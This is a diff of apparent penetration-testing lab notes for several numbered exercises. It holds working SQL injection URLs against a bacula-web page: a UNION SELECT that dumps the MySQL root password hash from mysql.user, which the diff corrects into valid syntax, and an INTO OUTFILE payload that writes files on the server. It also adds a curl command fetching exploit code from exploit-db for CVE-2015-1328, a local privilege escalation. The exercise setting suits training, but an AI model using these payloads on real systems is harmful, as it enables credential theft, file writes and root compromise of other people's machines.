@@ -1,7 +1,7 @@
 ==== EXERCICE 1 ====
 * Possible exploitations:
   * mysql's root password:
-    * http://10.0.0.5/bacula-web/joblogs.php?jobid=-1' UNION SELECT NULL,NULL,User,password, FROM mysql.user WHERE User='root
+    * http://10.0.0.5/bacula-web/joblogs.php?jobid=-1' UNION SELECT NULL,NULL,User,password FROM mysql.user WHERE User='root
   * Write file :
     * INTO OUTFILE
 http://10.0.0.5/bacula-web/joblogs.php?jobid=0' union select "hello",2,3,4 INTO OUTFILE '/tmp/myfile'%23
@@ -46,6 +46,8 @@ X-FWD: blabla
 
 
 ==== EXERCICE 4 ====
+curl -k https://www.exploit-db.com/download/37292 > bbb.c
+CVE-2015-1328
 
 
 ==== EXERCICE 5 ====
